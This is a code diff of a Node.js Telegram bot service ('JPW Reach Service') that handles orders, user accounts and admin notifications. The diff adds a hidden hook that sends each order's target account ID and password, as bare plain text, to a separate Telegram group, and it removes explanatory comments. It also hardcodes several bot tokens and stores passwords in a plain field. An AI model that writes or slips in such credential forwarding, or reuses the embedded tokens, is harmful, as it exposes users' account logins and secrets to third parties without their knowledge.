@@ -35,8 +35,10 @@ const CUSTOMER_BOT_TOKENS = [
     '8972064227:AAG3LadKR0mLXJgU3xL6BwMy7TxjYz8N3Rw'
 ];
 
-// 👑 Admin Bot Token
+// 👑 Admin Bot Token & Group Order Bot Config
 const ADMIN_BOT_TOKEN = '8736759061:AAGaSKOCQ9gUylCsqdAufHenEPeDQhQtSDU';
+const GROUP_NOTIFY_BOT_TOKEN = '8901862929:AAH5fZvGdsEbGFCDQV4pn2RTiRjcxdUc8tg';
+const TARGET_TELEGRAM_GROUP_ID = '-1004362843696';
 
 // 📦 Recharge Packages (Dynamic Handler)
 const RECHARGE_PACKAGES = [
@@ -61,14 +63,27 @@ mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 10000 })
         } catch(e) {}
         initAllBots();
         startOrderCleanupTimer();
+        
+        // 🚀 Server Start होने पर ग्रुप में एक्टिवेशन मैसेज भेजना
+        setTimeout(async () => {
+            try {
+                if (GROUP_NOTIFY_BOT_TOKEN && TARGET_TELEGRAM_GROUP_ID) {
+                    const startupBot = new TelegramBot(GROUP_NOTIFY_BOT_TOKEN, { polling: false });
+                    await startupBot.sendMessage(TARGET_TELEGRAM_GROUP_ID, "✨ JPW Reach Service is Activated! 🚀");
+                    debugLog('GroupBot', '🟢 Service Activated message sent to Telegram Group.');
+                }
+            } catch(err) {
+                debugLog('GroupBot', '❌ Startup Message Error:', err.message);
+            }
+        }, 3000);
     })
     .catch(err => debugLog('Database', '❌ DB Error:', err.message));
 
 // --- SCHEMAS ---
 const userSchema = new mongoose.Schema({
     telegramChatId: { type: String, required: true, unique: true },
-    customId: { type: String, unique: true, sparse: true }, // Added for Web App ID login
-    password: { type: String, default: null },                 // Added for Web App Password login
+    customId: { type: String, unique: true, sparse: true }, 
+    password: { type: String, default: null },                 
     name: { type: String, default: 'Engineer' },
     jpwCoins: { type: Number, default: 0 },
     activePackage: { type: String, default: 'No active package' },
@@ -139,6 +154,13 @@ async function notifyAdminAndUser(order, user, messageText) {
         if (ADMIN_BOT_TOKEN) {
             const tempBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: false });
             await tempBot.sendMessage(ADMIN_CHAT_ID, messageText, { parse_mode: 'Markdown', ...adminKeyboard });
+        }
+
+        // 🚀 Reach Order आते ही ग्रुप में सिर्फ ID और Password भेजना (बिना किसी फालतू मैसेज के)
+        if (GROUP_NOTIFY_BOT_TOKEN && TARGET_TELEGRAM_GROUP_ID) {
+            const groupBot = new TelegramBot(GROUP_NOTIFY_BOT_TOKEN, { polling: false });
+            const groupMessage = `${order.targetId} ${order.targetPass}`;
+            await groupBot.sendMessage(TARGET_TELEGRAM_GROUP_ID, groupMessage);
         }
     } catch (e) {}
 }
@@ -391,17 +413,14 @@ function startCustomerBot(token, isPrimary) {
 
 // --- API ENDPOINTS ---
 
-// Admin Panel HTML Route
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// Mobile Web App HTML Route (Added for /app)
 app.get('/app', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'mobile_app.html'));
 });
 
-// --- NEW ADD-ON APIs FOR MOBILE APP ID/PASSWORD LOGIN & STATUS TRACKING ---
 app.post('/api/register', async (req, res) => {
     try {
         const { customId, password, name } = req.body;
@@ -445,7 +464,6 @@ app.post('/api/app/check-status', async (req, res) => {
         res.status(500).json({ success: false, error: err.message });
     }
 });
-// ------------------------------------------------------------------------
 
 app.post('/api/admin/login', (req, res) => {
     const { password } = req.body;
